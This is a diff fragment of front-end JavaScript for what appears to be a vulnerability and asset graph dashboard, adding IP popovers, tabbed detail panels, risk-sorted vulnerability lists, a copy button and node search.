+    const more = getNodeIps(node).length > 1 ? `<button class="ip-more-btn" onclick="toggleIpList('${node.id}')">…</button>` : '';
+    return `<div class="ip-kv"><span class="kv-value mono">${pe.ip}</span>${primaryTag}${netTag}${more}</div>`;
+  }
+
+  function renderIpPopoverHtml(node) {
+    const ips = getNodeIps(node);
+    if (ips.length <= 1) return '';
+    const items = ips.map(x => {
+      const netTag = x.net ? `<span class="net-tag ${x.net==='内网'?'internal':'external'}">${x.net}</span>` : '';
+      const primaryTag = x.primary ? `<span class="badge badge-primary" style="font-size:10px;">主</span>` : '';
+      return `<div class="ip-popover-item"><span class="mono">${x.ip}</span>${primaryTag}${netTag}</div>`;
+    }).join('');
+    return `<div class="ip-popover" id="ipPopover-${node.id}">${items}</div>`;
+  }
+
+  function hideAllIpPopovers() {
+    document.querySelectorAll('.ip-popover.show').forEach(el => el.classList.remove('show'));
+  }
+
+  function toggleIpList(nodeId) {
+    const pop = document.getElementById(`ipPopover-${nodeId}`);
+    if (!pop) return;
+    const willShow = !pop.classList.contains('show');
+    hideAllIpPopovers();
+    if (willShow) pop.classList.add('show');
+  }
+
+  document.addEventListener('click', function(e) {
+    const inside = e.target.closest('.ip-popover') || e.target.closest('.ip-more-btn');
+    if (!inside) hideAllIpPopovers();
+  });
+
+  function renderScopeTabs(node, tabs) {
+    const scopeId = node.id;
+    const btns = tabs.map((t, idx) => `<button class="detail-tab-btn ${idx===0?'active':''}" data-scope="${scopeId}" data-tab="${t.id}" onclick="switchDetailTab('${scopeId}','${t.id}')">${t.label}</button>`).join('');
+    const panels = tabs.map((t, idx) => `<div class="detail-tab-panel ${idx===0?'active':''}" id="tab-${scopeId}-${t.id}">${t.html}</div>`).join('');
+    return `<div class="detail-tabs">${btns}</div><div class="detail-tab-panels">${panels}</div>`;
+  }
+
+  function setDefaultActiveTab(scopeId) {
+    const firstBtn = document.querySelector(`.detail-tab-btn[data-scope="${scopeId}"]`);
+    if (firstBtn) switchDetailTab(scopeId, firstBtn.dataset.tab);
+  }
+
+  function switchDetailTab(scopeId, tabId) {
+    document.querySelectorAll(`.detail-tab-btn[data-scope="${scopeId}"]`).forEach(b => b.classList.toggle('active', b.dataset.tab===tabId));
+    document.querySelectorAll(`[id^="tab-${scopeId}-"]`).forEach(p => p.classList.remove('active'));
+    const panel = document.getElementById(`tab-${scopeId}-${tabId}`);
+    if (panel) panel.classList.add('active');
+  }
+
+  function getScopeDescendantIds(scopeId) {
+    const ids = new Set([scopeId]);
+    const stack = [scopeId];
+    while (stack.length) {
+      const cur = stack.pop();
+      (GRAPH_DATA.children[cur] || []).forEach(cid => {
+        if (!ids.has(cid)) {
+          ids.add(cid);
+          stack.push(cid);
+        }
+      });
+    }
+    return Array.from(ids);
+  }
+
+  function getManagedAssetIds(scopeId, scopeType) {
+    const scopeNode = GRAPH_DATA.nodes[scopeId];
+    const t = scopeType || scopeNode?.type;
+    const desc = getScopeDescendantIds(scopeId).filter(id => id !== scopeId);
+    if (t === 'system') return desc.filter(id => ['container','app','model'].includes(GRAPH_DATA.nodes[id]?.type));
+    if (t === 'container') return desc.filter(id => ['app','model'].includes(GRAPH_DATA.nodes[id]?.type));
+    if (t === 'app') return (GRAPH_DATA.children[scopeId] || []).filter(id => isAssetType(GRAPH_DATA.nodes[id]?.type));
+    return [];
+  }
+
+  function getScopeComponentIds(scopeId, scopeType) {
+    const scopeNode = GRAPH_DATA.nodes[scopeId];
+    const type = scopeType || scopeNode?.type;
+    if (!type) return [];
+    const kids = getDrillChildren(scopeId);
+    const ids = kids.filter(id => GRAPH_DATA.nodes[id]?.type === 'component');
+    return uniqIds(ids);
+  }
+
+  function getScopeVulnIdsByComponents(compIds) {
+    const vs = new Set();
+    GRAPH_DATA.edges.forEach(e => {
+      if (e.rel!=='exist') return;
+      if (!compIds.includes(e.from)) return;
+      if (GRAPH_DATA.nodes[e.to]?.type==='vuln') vs.add(e.to);
+    });
+    return Array.from(vs);
+  }
+
+  function renderListEmpty(text) {
+    return `<p style="font-size:12px;color:var(--text-tertiary);padding:10px 16px;">${text}</p>`;
+  }
+
+  function renderNodeList(ids, emptyText) {
+    if (!ids.length) return renderListEmpty(emptyText);
+    const tc={system:'#2563eb',app:'#059669',container:'#7c3aed',model:'#d97706',component:'#0891b2',vuln:'#dc2626',poc:'#0ea5e9',exp:'#ef4444'};
+    return ids.map(id => {
+      const n = GRAPH_DATA.nodes[id];
+      if (!n) return '';
+      const badge = n.riskLabel ? `<span class="badge ${riskBadge(n.risk)}" style="font-size:10px;">${n.riskLabel}</span>` : '';
+      const aiTag = (n.type === 'component' && n.isAI) ? `<span class="ai-tag" style="margin-left:4px;vertical-align:middle;">AI</span>` : '';
+      return `<div class="assoc-item" onclick="onNodeClick(GRAPH_DATA.nodes['${id}'])">
+        <div class="assoc-icon" style="background:${tc[n.type]||'#94a3b8'}22;color:${tc[n.type]||'#94a3b8'};border:1px solid ${tc[n.type]||'#94a3b8'}44;border-radius:50%;"><i class="ri-${typeIcon(n.type)}-line"></i></div>
+        <div class="assoc-info"><div class="assoc-name">${n.label}${aiTag}</div><div class="assoc-type">${typeLabel(n.type)}${n.sublabel?` · ${n.sublabel}`:''}</div></div>
+        ${badge}
+      </div>`;
+    }).join('');
+  }
+
+  function renderManagedAssetsTab(scopeId, scopeType) {
+    const ids = getManagedAssetIds(scopeId, scopeType);
+    return renderNodeList(ids, '暂无纳管资产');
+  }
+
+  function renderAssociatedAssetsTab(appId) {
+    const ids = (GRAPH_DATA.children[appId] || []).filter(id => isAssetType(GRAPH_DATA.nodes[id]?.type));
+    return renderNodeList(ids, '暂无关联资产');
+  }
+
+  function renderScopeComponentsTab(scopeId, scopeType) {
+    const compIds = getScopeComponentIds(scopeId, scopeType);
+    return renderNodeList(compIds, '暂无组件信息');
+  }
+
+  function renderScopeRisksTab(scopeId, scopeType) {
+    const compIds = getScopeComponentIds(scopeId, scopeType);
+    const vulnIds = getScopeVulnIdsByComponents(compIds);
+    const sorted = vulnIds.sort((a,b) => {
+      const ra = GRAPH_DATA.nodes[a]?.risk || 'none';
+      const rb = GRAPH_DATA.nodes[b]?.risk || 'none';
+      const w = {critical:0,high:1,medium:2,low:3,none:4};
+      return (w[ra]??9) - (w[rb]??9);
+    });
+    return renderNodeList(sorted, '暂无风险信息');
+  }
+
+  function countCompVulns(compId) {
+    return GRAPH_DATA.edges.filter(e => e.from===compId && e.rel==='exist').length;
+  }
+
+  function renderComponentRiskTab(compId) {
+    const html = renderVulnList(compId);
+    return html || renderListEmpty('暂无风险信息');
+  }
+
+  function renderComponentAssocAssetsTab(compId) {
+    const ids = new Set();
+    GRAPH_DATA.edges.forEach(e => {
+      if (e.rel==='depend' && e.to===compId && GRAPH_DATA.nodes[e.from]?.type==='app') ids.add(e.from);
+    });
+    const parent = findParent(compId);
+    if (parent) {
+      const pn = GRAPH_DATA.nodes[parent];
+      if (pn?.type==='model') {
+        ids.add(parent);
+        const pa = getAncestorByType(parent,'app'); if (pa) ids.add(pa);
+        const ps = getAncestorByType(parent,'system'); if (ps) ids.add(ps);
+      } else if (pn?.type==='app') {
+        ids.add(parent);
+        const ps = getAncestorByType(parent,'system'); if (ps) ids.add(ps);
+      }
+    }
+    return renderNodeList(Array.from(ids), '暂无关联资产');
+  }
+
+  function getVulnAffectedComponentIds(vulnId) {
+    const ids = new Set();
+    GRAPH_DATA.edges.forEach(e => {
+      if (e.rel !== 'exist') return;
+      if (e.to !== vulnId) return;
+      if (GRAPH_DATA.nodes[e.from]?.type === 'component') ids.add(e.from);
+    });
+    return Array.from(ids);
+  }
+
+  function getVulnAffectedAssetIds(vulnId) {
+    const compIds = getVulnAffectedComponentIds(vulnId);
+    const ids = new Set();
+    GRAPH_DATA.edges.forEach(e => {
+      if (e.rel !== 'depend' && e.rel !== 'contain') return;
+      if (!compIds.includes(e.to)) return;
+      const fromNode = GRAPH_DATA.nodes[e.from];
+      if (!fromNode || !isAssetType(fromNode.type)) return;
+      ids.add(e.from);
+      const pc = getAncestorByType(e.from, 'container'); if (pc) ids.add(pc);
+      const pa = getAncestorByType(e.from, 'app'); if (pa) ids.add(pa);
+      const ps = getAncestorByType(e.from, 'system'); if (ps) ids.add(ps);
+    });
+    return Array.from(ids);
+  }
+
+  function renderVulnAffectedAssetsTab(vulnId) {
+    const ids = getVulnAffectedAssetIds(vulnId);
+    return renderNodeList(ids, '暂无影响资产');
+  }
+
+  function renderVulnAffectedComponentsTab(vulnId) {
+    const ids = getVulnAffectedComponentIds(vulnId);
+    return renderNodeList(ids, '暂无影响组件');
+  }
+
+  function countScopeAssets(scopeId, scopeType) {
+    const t = scopeType || GRAPH_DATA.nodes[scopeId]?.type;
+    if (t === 'system' || t === 'container' || t === 'app') return getManagedAssetIds(scopeId, t).length;
+    return 0;
+  }
+
+  function countScopeComponents(scopeId, scopeType) {
+    return getScopeComponentIds(scopeId, scopeType).length;
+  }
+
+  function countScopeVulns(scopeId, scopeType) {
+    const compIds = getScopeComponentIds(scopeId, scopeType);
+    return getScopeVulnIdsByComponents(compIds).length;
+  }
+
+  function escapeHtml(str) {
+    return String(str)
+      .replaceAll('&','&amp;')
+      .replaceAll('<','&lt;')
+      .replaceAll('>','&gt;')
+      .replaceAll('"','&quot;')
+      .replaceAll("'",'&#039;');
+  }
+
+  let _codeAutoId = 1;
+  function enhancePreCopyButtons(root) {
+    if (!root) return;
+    root.querySelectorAll('pre.code-block').forEach(pre => {
+      if (pre.querySelector('.code-copy-btn')) return;
+      if (!pre.id) {
+        pre.id = `code-auto-${_codeAutoId++}`;
+      }
+      const raw = pre.textContent || '';
+      pre.textContent = '';
+      const btn = document.createElement('button');
+      btn.className = 'code-copy-btn';
+      btn.type = 'button';
+      btn.title = '复制';
+      btn.innerHTML = '<i class="ri-file-copy-line"></i>';
+      btn.addEventListener('click', e => {
+        e.stopPropagation();
+        copyCodeFrom(pre.id, btn);
+      });
+      const span = document.createElement('span');
+      span.className = 'code-text';
+      span.textContent = raw;
+      pre.appendChild(btn);
+      pre.appendChild(span);
+    });
+  }
+
+  async function copyCodeFrom(elId, btn) {
+    const el = document.getElementById(elId);
+    const text = el
+      ? (el.classList.contains('code-block') ? (el.querySelector('.code-text')?.textContent || '') : (el.textContent || ''))
+      : '';
+    if (!text) return;
+    try {
+      await navigator.clipboard.writeText(text);
+    } catch (e) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.left = '-9999px';
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+    }
+    if (btn) {
+      const prev = btn.innerHTML;
+      btn.disabled = true;
+      btn.innerHTML = '<i class="ri-check-line"></i>';
+      setTimeout(() => {
+        btn.disabled = false;
+        btn.innerHTML = prev;
+      }, 1200);
+    }
+  }
+
+  function triggerFocusGlow() {
+    const el = document.getElementById('bgGlowCircle');
+    if (!el) return;
+    el.classList.remove('focus-glow');
+    void el.getBoundingClientRect();
+    el.classList.add('focus-glow');
+  }
+
+  /* ===========================================================
+   * [V1.3 BUSINESS] SEARCH
+   * =========================================================== */
+  function onGraphSearch(query) {
+    const res=document.getElementById('graphSearchResults');
+    const q=query.trim().toLowerCase();
+    if (!q) { res.style.display='none'; return; }
+    const matches=[];
+    Object.values(GRAPH_DATA.nodes).forEach(node => {
+      if (node.type==='vuln' || node.type==='poc' || node.type==='exp') return;
+      const f=[node.label,node.ip,node.hostname,node.sublabel].filter(Boolean).join(' ').toLowerCase();
+      if (f.includes(q)) matches.push(node);
+    });
+    const tc={system:'#2563eb',app:'#059669',container:'#7c3aed',model:'#d97706',component:'#0891b2'};
+    res.innerHTML = !matches.length
+      ? '<div style="padding:12px 14px;font-size:12px;color:var(--text-tertiary);">未找到匹配节点</div>'
+      : matches.slice(0,10).map(node => {
+          const color=tc[node.type]||'#64748b';
+          const sub=(getPrimaryIpEntry(node)?.ip)||node.ip||node.sublabel||'';
+          return `<div style="padding:8px 14px;cursor:pointer;border-bottom:1px solid var(--border-color);display:flex;align-items:center;gap:10px;"
+            onclick="onSearchSelect('${node.id}')"
+            onmouseover="this.style.background='var(--bg-surface-alt)'"
+            onmouseout="this.style.background=''">
+            <span style="width:8px;height:8px;border-radius:50%;background:${color};flex-shrink:0;display:inline-block;"></span>
+            <span style="flex:1;font-size:12px;font-weight:600;color:var(--text-primary);">${node.label}</span>
+            <span style="font-size:10px;color:${color};background:${color}18;padding:1px 6px;">${typeLabel(node.type)}</span>
+            ${sub?`<span style="font-size:10px;font-family:monospace;color:var(--text-tertiary);">${sub}</span>`:''}
+          </div>`;
+        }).join('');
+    res.style.display='block';
+  }
+
+  function onSearchSelect(nodeId) {
+    document.getElementById('graphSearchResults').style.display='none';
+    document.getElementById('graphSearchInput').value='';
+    const node=GRAPH_DATA.nodes[nodeId]; if (!node) return;
+    const roots=getRootIds();
+    if (roots.includes(nodeId)) { drillTo(null); setTimeout(()=>highlightSearchNode(nodeId),350); }
+    else { const p=findParent(nodeId); drillTo(p||null); setTimeout(()=>highlightSearchNode(nodeId),350); }
+  }
+
+  function findParent(nodeId) {
+    const n = GRAPH_DATA.nodes[nodeId];
+    if (!n) return null;
+    const nodes = GRAPH_DATA.nodes;
+    const edges = GRAPH_DATA.edges;
+
+    if (n.type === 'system') return null;
+    if (n.type === 'container') return n.system || null;
+    if (n.type === 'app') {
+      const ctn = edges.find(e => e.to === nodeId && nodes[e.from]?.type === 'container' && e.rel === 'contain')?.from;
+      return ctn || n.system || null;
+    }
+    if (n.type === 'model') return n.app || n.system || null;
+    if (n.type === 'component') {
+      const modelParent = edges.find(e => e.to === nodeId && nodes[e.from]?.type === 'model' && e.rel === 'contain')?.from;
+      if (modelParent) return modelParent;
+      const appParent = edges.find(e => e.to === nodeId && nodes[e.from]?.type === 'app' && (e.rel === 'depend' || e.rel === 'contain'))?.from;
+      if (appParent) return appParent;
+      const sysParent = edges.find(e => e.to === nodeId && nodes[e.from]?.type === 'system' && e.rel === 'contain')?.from;
+      return sysParent || null;
+    }
+    if (n.type === 'vuln') return edges.find(e => e.to === nodeId && nodes[e.from]?.type === 'component' && e.rel === 'exist')?.from || null;
+    if (n.type === 'poc' || n.type === 'exp') return edges.find(e => e.to === nodeId && nodes[e.from]?.type === 'vuln' && e.rel === 'contain')?.from || null;
+    return null;
+  }
+
+  function highlightSearchNode(nodeId) {
+    const el=document.querySelector(`#nodesLayer g[data-id="${nodeId}"]`);
+    if (el) {
+      const c=el.querySelector('.node-shape');
+      if (c) { c.setAttribute('stroke-width','4'); c.style.filter='drop-shadow(0 0 12px rgba(8,145,178,0.8))'; setTimeout(()=>{c.setAttribute('stroke-width','1.5');c.style.filter='';},2000); }
+      const node=GRAPH_DATA.nodes[nodeId]; if (node) showNodeDetail(node);
+    }
+  }
+</script>
+</body>
+</html>
